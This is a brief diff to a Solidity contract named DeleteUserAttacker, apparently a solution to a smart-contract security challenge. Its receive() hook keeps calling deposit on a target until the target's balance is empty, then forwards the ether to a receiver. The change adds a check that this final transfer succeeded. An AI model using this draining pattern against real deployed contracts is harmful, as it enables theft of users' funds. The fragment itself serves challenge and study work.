@@ -21,7 +21,8 @@ contract DeleteUserAttacker {
 
     receive() external payable {
         if (address(target).balance == 0) {
-            receiver.call{value: address(this).balance}("");
+            (bool ok,) = receiver.call{value: address(this).balance}("");
+            require(ok, "transfer failed");
             return;
         }
         target.deposit();
